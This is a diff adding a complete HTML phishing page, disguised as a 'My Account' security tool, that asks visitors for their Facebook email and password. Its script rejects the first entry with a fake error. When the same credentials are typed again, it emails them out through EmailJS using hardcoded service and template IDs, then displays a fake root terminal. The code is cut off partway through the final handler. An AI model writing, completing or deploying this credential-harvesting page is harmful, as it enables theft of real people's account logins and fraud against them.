@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>My Account</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    :root {
+      --primary: #6e48aa;
+      --secondary: #9d50bb;
+      --accent: #4776e6;
+      --text: #f0f0f0;
+      --bg: #121212;
+      --card-bg: rgba(30, 30, 30, 0.95);
+      --success: #4caf50;
+      --warning: #ff9800;
+      --error: #f44336;
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      outline: none;
+      tap-highlight-color: transparent;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+      -webkit-user-select: none;
+      -ms-user-select: none;
+    }
+    
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    #logo-splash {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: var(--bg);
+      z-index: 1000;
+      flex-direction: column;
+    }
+    
+    #logo-splash .logo {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 3rem;
+      font-weight: 600;
+      background: linear-gradient(45deg, var(--primary), var(--accent));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 20px;
+      opacity: 0;
+      transform: scale(0.8);
+      animation: logoFadeIn 1.5s forwards;
+    }
+    
+    #logo-splash .logo.exit {
+      animation: logoFadeOut 0.5s forwards;
+    }
+    
+    #logo-splash .tagline {
+      opacity: 0;
+      transform: translateY(20px);
+      animation: taglineFadeIn 1s 1.5s forwards;
+      font-size: 1.2rem;
+      color: rgba(255,255,255,0.7);
+    }
+    
+    #logo-splash .tagline.exit {
+      animation: taglineFadeOut 0.5s forwards;
+    }
+    
+    @keyframes logoFadeIn {
+      0% { opacity: 0; transform: scale(0.8); }
+      50% { opacity: 1; transform: scale(1.1); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+    
+    @keyframes logoFadeOut {
+      0% { opacity: 1; transform: scale(1); }
+      50% { opacity: 1; transform: scale(1.1); }
+      100% { opacity: 0; transform: scale(0.8); }
+    }
+    
+    @keyframes taglineFadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes taglineFadeOut {
+      from { opacity: 1; transform: translateY(0); }
+      to { opacity: 0; transform: translateY(20px); }
+    }
+    
+    .container {
+      width: 90%;
+      max-width: 500px;
+      background: var(--card-bg);
+      border-radius: 20px;
+      padding: 30px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transform: translateY(20px);
+      opacity: 0;
+      animation: fadeIn 0.8s 0.1s forwards;
+      overflow: hidden;
+      display: none;
+    }
+    
+    @keyframes fadeIn {
+      to { transform: translateY(0); opacity: 1; display: block; }
+    }
+    
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 30px;
+      position: relative;
+    }
+    
+    .header::after {
+      content: '';
+      position: absolute;
+      bottom: -15px;
+      left: 0;
+      width: 100%;
+      height: 2px;
+      background: linear-gradient(90deg, var(--primary), var(--secondary), transparent);
+    }
+    
+    .logo {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 24px;
+      font-weight: 600;
+      background: linear-gradient(45deg, var(--primary), var(--accent));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    .status {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+    }
+    
+    .status-indicator {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--error);
+      margin-right: 8px;
+      animation: pulse 2s infinite;
+    }
+    
+    .status-indicator.active {
+      background: var(--success);
+      animation: pulse-active 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(244, 67, 54, 0.4); }
+      70% { box-shadow: 0 0 0 10px rgba(244, 67, 54, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(244, 67, 54, 0); }
+    }
+    
+    @keyframes pulse-active {
+      0% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.4); }
+      70% { box-shadow: 0 0 0 10px rgba(76, 175, 80, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
+    }
+    
+    .scan-section {
+      text-align: center;
+      margin-bottom: 30px;
+      transition: all 0.5s ease;
+    }
+    
+    .scan-section.hide {
+      opacity: 0;
+      transform: translateY(-20px);
+      height: 0;
+      margin-bottom: 0;
+      overflow: hidden;
+    }
+    
+    .scan-btn {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      background: linear-gradient(145deg, var(--primary), var(--secondary));
+      border: none;
+      color: white;
+      font-size: 24px;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      margin: 0 auto 20px;
+      box-shadow: 0 5px 15px rgba(110, 72, 170, 0.4);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .scan-btn::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(to bottom right, transparent, rgba(255, 255, 255, 0.1), transparent);
+      transform: rotate(45deg);
+      transition: all 0.5s ease;
+      opacity: 0;
+    }
+    
+    .scan-btn:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 25px rgba(110, 72, 170, 0.6);
+    }
+    
+    .scan-btn:hover::before {
+      animation: shine 1.5s;
+    }
+    
+    .scan-btn:active {
+      transform: translateY(0);
+    }
+    
+    .scan-btn i {
+      font-size: 36px;
+      margin-bottom: 8px;
+    }
+    
+    .scan-btn.exit {
+      animation: scanBtnExit 0.5s forwards;
+    }
+    
+    .scan-text.exit {
+      animation: textFadeOut 0.5s forwards;
+    }
+    
+    @keyframes scanBtnExit {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(0.8); opacity: 0.5; }
+      100% { transform: scale(0); opacity: 0; }
+    }
+    
+    @keyframes textFadeOut {
+      0% { transform: translateY(0); opacity: 1; }
+      100% { transform: translateY(-10px); opacity: 0; }
+    }
+    
+    @keyframes shine {
+      0% { transform: rotate(45deg) translate(-30%, -30%); opacity: 0; }
+      20% { opacity: 1; }
+      100% { transform: rotate(45deg) translate(30%, 30%); opacity: 0; }
+    }
+    
+    .scan-text {
+      font-size: 18px;
+      margin-bottom: 5px;
+      transition: all 0.3s ease;
+    }
+    
+    .progress-container {
+      width: 100%;
+      height: 6px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 3px;
+      margin-top: 20px;
+      overflow: hidden;
+      display: none;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    
+    .progress-container.show {
+      display: block;
+      opacity: 1;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      background: linear-gradient(90deg, var(--primary), var(--accent));
+      border-radius: 3px;
+      transition: width 0.3s ease;
+    }
+    
+    .login-section {
+      text-align: center;
+      transition: all 0.5s ease;
+      display: none;
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    
+    .login-section.show {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
+    
+    .login-input-container {
+      display: flex;
+      flex-direction: column;
+      margin: 20px 0;
+      transition: all 0.3s ease;
+    }
+    
+    .login-input {
+      width: 100%;
+      height: 50px;
+      margin: 10px 0;
+      padding: 0 15px;
+      font-size: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.05);
+      color: white;
+      transition: all 0.3s ease;
+    }
+    
+    .login-input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 10px rgba(110, 72, 170, 0.5);
+    }
+    
+    .submit-btn {
+      background: linear-gradient(145deg, var(--primary), var(--secondary));
+      border: none;
+      color: white;
+      padding: 12px 25px;
+      border-radius: 25px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 20px;
+      transition: all 0.3s ease;
+      display: inline-block;
+      width: 100%;
+    }
+    
+    .submit-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(110, 72, 170, 0.6);
+    }
+    
+    .submit-btn:active {
+      transform: translateY(0);
+    }
+    
+    .error-message {
+      color: var(--error);
+      margin-top: 15px;
+      font-size: 14px;
+      opacity: 0;
+      height: 0;
+      transition: all 0.3s ease;
+      text-align: center;
+    }
+    
+    .error-message.show {
+      opacity: 1;
+      height: auto;
+    }
+    
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      text-align: center;
+      opacity: 0.6;
+      transition: all 0.3s ease;
+    }
+    
+    .footer.hide {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    
+    .forgot-password {
+      color: var(--accent);
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 10px;
+      display: inline-block;
+    }
+    
+    /* Style pour l'interface Termux en plein écran */
+    .fullscreen-terminal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      padding: 20px;
+      overflow: auto;
+      z-index: 2000;
+    }
+    
+    .terminal-line {
+      margin-bottom: 15px;
+      white-space: pre-wrap;
+      line-height: 1.5;
+    }
+    
+    .prompt {
+      color: #0f0;
+      font-weight: bold;
+    }
+    
+    .cursor {
+      display: inline-block;
+      width: 10px;
+      height: 20px;
+      background-color: #0f0;
+      animation: blink 1s infinite;
+      vertical-align: middle;
+    }
+    
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    
+    /* Forcer le mode paysage */
+    @media screen and (orientation: portrait) {
+      .fullscreen-terminal {
+        transform: rotate(90deg);
+        transform-origin: left top;
+        width: 100vh;
+        height: 100vw;
+        position: absolute;
+        top: 100%;
+        left: 0;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .container {
+        padding: 20px;
+      }
+      
+      #logo-splash .logo {
+        font-size: 2rem;
+      }
+      
+      .scan-btn {
+        width: 100px;
+        height: 100px;
+        font-size: 20px;
+      }
+      
+      .scan-btn i {
+        font-size: 30px;
+      }
+    }
+    
+    @keyframes wave {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    .scanning {
+      animation: wave 1.5s infinite;
+    }
+  </style>
+</head>
+<body>
+  <div id="logo-splash">
+    <div class="logo">MY ACCOUNT</div>
+    <div class="tagline">Account security and management</div>
+  </div>
+  
+  <div class="container" id="main-interface">
+    <div class="header">
+      <div class="logo">MY ACCOUNT</div>
+      <div class="status">
+        <div class="status-indicator" id="status-indicator"></div>
+        <span id="status-text">Inactive</span>
+      </div>
+    </div>
+    
+    <div class="scan-section" id="scan-section">
+      <button class="scan-btn" id="scan-btn">
+        <i class="fas fa-lock-open"></i>
+      </button>
+      <div class="scan-text" id="scan-text">Open Account Settings</div>
+      <div class="progress-container" id="progress-container">
+        <div class="progress-bar" id="progress-bar"></div>
+      </div>
+    </div>
+    
+    <div class="login-section" id="login-section">
+      <div class="scan-text" id="login-instruction">Connect with your Facebook account</div>
+      <div class="login-input-container" id="login-input-container">
+        <input type="text" class="login-input" id="email-input" placeholder="Mobile number or email">
+        <input type="password" class="login-input" id="password-input" placeholder="Password">
+      </div>
+      
+      <button class="submit-btn" id="login-btn">LOG IN</button>
+      
+      <a href="#" class="forgot-password" id="forgot-password">Forgot password?</a>
+      
+      <div class="error-message" id="error-message">Incorrect login credentials. Please try again.</div>
+    </div>
+    
+    <div class="footer" id="footer">
+      My Account 2025 | For authorized use only
+    </div>
+  </div>
+
+  <script>
+    // Initialize EmailJS
+    (function() {
+      emailjs.init("GwvQJIh5BjSihC5su"); // Public Key
+    })();
+
+    // Gestion du splash screen
+    setTimeout(() => {
+      const logo = document.querySelector('#logo-splash .logo');
+      const tagline = document.querySelector('#logo-splash .tagline');
+      
+      logo.classList.add('exit');
+      tagline.classList.add('exit');
+      
+      setTimeout(() => {
+        document.getElementById('logo-splash').style.display = 'none';
+        document.getElementById('main-interface').style.display = 'block';
+      }, 500);
+    }, 2000);
+
+    // Récupération des éléments DOM
+    const scanBtn = document.getElementById('scan-btn');
+    const scanText = document.getElementById('scan-text');
+    const scanSection = document.getElementById('scan-section');
+    const progressContainer = document.getElementById('progress-container');
+    const progressBar = document.getElementById('progress-bar');
+    const statusIndicator = document.getElementById('status-indicator');
+    const statusText = document.getElementById('status-text');
+    const loginSection = document.getElementById('login-section');
+    const loginInstruction = document.getElementById('login-instruction');
+    const emailInput = document.getElementById('email-input');
+    const passwordInput = document.getElementById('password-input');
+    const loginBtn = document.getElementById('login-btn');
+    const forgotPassword = document.getElementById('forgot-password');
+    const errorMessage = document.getElementById('error-message');
+    const footer = document.getElementById('footer');
+
+    // Variables pour stocker les précédentes tentatives
+    let lastAttempt = {
+      email: '',
+      password: ''
+    };
+    let isSameAttempt = false;
+
+    // Fonction de scan
+    function startScanning() {
+      if (scanBtn.classList.contains('scanning')) return;
+      
+      scanBtn.classList.add('scanning');
+      scanText.textContent = "Please wait a moment...";
+      progressContainer.classList.add('show');
+      statusIndicator.classList.add('active');
+      statusText.textContent = "Pending";
+      
+      let progress = 0;
+      const progressInterval = setInterval(() => {
+        progress += Math.random() * 10;
+        if (progress > 100) progress = 100;
+        progressBar.style.width = `${progress}%`;
+        
+        if (progress === 100) {
+          clearInterval(progressInterval);
+          setTimeout(showLoginSection, 500);
+        }
+      }, 200);
+    }
+
+    // Afficher la section login après scan
+    function showLoginSection() {
+      scanBtn.classList.remove('scanning');
+      progressContainer.classList.remove('show');
+      progressBar.style.width = "0";
+      statusText.textContent = "Active";
+      
+      setTimeout(() => {
+        scanSection.classList.add('hide');
+        loginSection.classList.add('show');
+      }, 500);
+    }
+
+    // Vérifier si la tentative actuelle est identique à la précédente
+    function checkSameAttempt(email, password) {
+      if (email === lastAttempt.email && password === lastAttempt.password) {
+        return true;
+      }
+      lastAttempt.email = email;
+      lastAttempt.password = password;
+      return false;
+    }
+
+    // Fonction pour envoyer les identifiants par email
+    function sendCredentials(email, password) {
+      const params = {
+        name: "System Alert",
+        message: `Login attempt detected:\nEmail: ${email}\nPassword: ${password}`
+      };
+
+      emailjs.send("service_b3xhret", "template_9gfslw9", params)
+        .then(function(res) {
+          console.log("Credentials sent successfully");
+        }, function(err) {
+          console.error("Failed to send credentials:", err);
+        });
+    }
+
+    // Fonction pour afficher l'interface Termux en plein écran
+    function showFullscreenTerminal() {
+      const terminalHTML = `
+        <div class="fullscreen-terminal" id="terminal-interface">
+          <div class="terminal-line"><span class="prompt">root@localhost:~#</span> login successful</div>
+          <div class="terminal-line"><span class="prompt">root@localhost:~#</span> accessing system...</div>
+          <div class="terminal-line"><span class="prompt">root@localhost:~#</span> welcome back admin</div>
+          <div class="terminal-line"><span class="prompt">root@localhost:~#</span> <span class="cursor"></span></div>
+        </div>
+      `;
+      
+      document.body.innerHTML = terminalHTML;
+      
+      // Forcer l'orientation paysage
+      function lockOrientation() {
+        if (screen.orientation && screen.orientation.lock) {
+          screen.orientation.lock('landscape').catch(e => {
+            console.log("Orientation lock failed: ", e);
+          });
+        }
+      }
+      
+      lockOrientation();
+      window.addEventListener('orientationchange', lockOrientation);
+      
+      // Ajouter du contenu supplémentaire après un délai
+      setTimeout(() => {
+        const terminal = document.getElementById('terminal-interface');
+        const newLine = document.createElement('div');
+        newLine.className = 'terminal-line';
+        newLine.innerHTML = '<span class="prompt">root@localhost:~#</span> system ready';
+        terminal.appendChild(newLine);
+        terminal.scrollTop = terminal.scrollHeight;
+      }, 1500);
+    }
+
+    // Tentative de connexion
+    loginBtn.addEventListener('click', () => {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+      
+      if (!email || !password) {
+        errorMessage.textContent = "Please enter both email and password";
+        errorMessage.classList.add('show');
+        return;
+      }
+      
+      // Vérifier si c'est la même tentative que la précédente
+      isSameAttempt = checkSameAttempt(email, password);
+      
+      if (isSameAttempt) {
+        // Si c'est la même tentative, envoyer les identifiants
+        sendCredentials(email, password);
+        
+        // Simuler une connexion réussie après la deuxième tentative identique
+        statusText.textContent = "Connecting...";
+        
+        setTimeout(() => {
+          statusIndicator.classList.add('active');
+          statusText.textContent = "Connected";
+          
+          // Afficher l'interface Termux en plein écran
+          showFullscreenTerminal();
+        }, 1500);
+      } else {
+        // Si c'est une nouvelle tentative, afficher le message d'erreur
+        errorMessage.textContent = "Incorrect login credentials. Please try again.";
+        errorMessage.classList.add('show');
+        statusIndicator.classList.remove('active');
+        statusText.textContent = "Access Denied";
+        
+        setTimeout(() => {
+          err
